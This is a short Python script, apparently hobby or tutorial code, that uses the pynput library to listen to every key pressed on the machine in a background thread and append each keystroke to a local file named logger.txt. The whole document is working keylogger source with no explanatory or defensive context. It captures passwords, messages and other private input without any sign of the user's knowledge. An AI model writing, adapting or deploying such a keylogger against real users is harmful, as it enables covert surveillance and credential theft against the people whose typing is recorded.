from pynput import keyboard
import threading

def get_key(key):
    try:
        with open("logger.txt", "a") as f:
            f.write(f"{key.char}")
    except:
        with open ("logger.txt", "a") as f:
            f.write(f"{key}")
            
def start():
    with keyboard.Listener(on_press=get_key) as listener:
        listener.join()
        
thread = threading.Thread(target=start)
thread.start()
